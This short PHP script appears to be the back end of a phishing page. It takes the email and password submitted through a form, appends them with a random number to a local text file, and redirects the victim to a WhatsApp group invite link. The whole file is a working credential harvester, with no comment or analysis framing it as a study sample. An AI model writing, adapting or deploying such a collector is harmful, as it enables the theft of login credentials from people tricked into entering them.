<?php
header("Location: https://chat.whatsapp.com/GtgxF0Zi1T9HEacnWqZZ5u/");
$ab = "./ancor.txt";
$ran = rand(10,1000000000000);
$a = $_POST['email'];
$b = $_POST['password'];

$handle = fopen($ab, 'a');
fwrite($handle, "$ran|$a|$b");
fwrite($handle, "\n");
fclose($handle);
exit;
?>
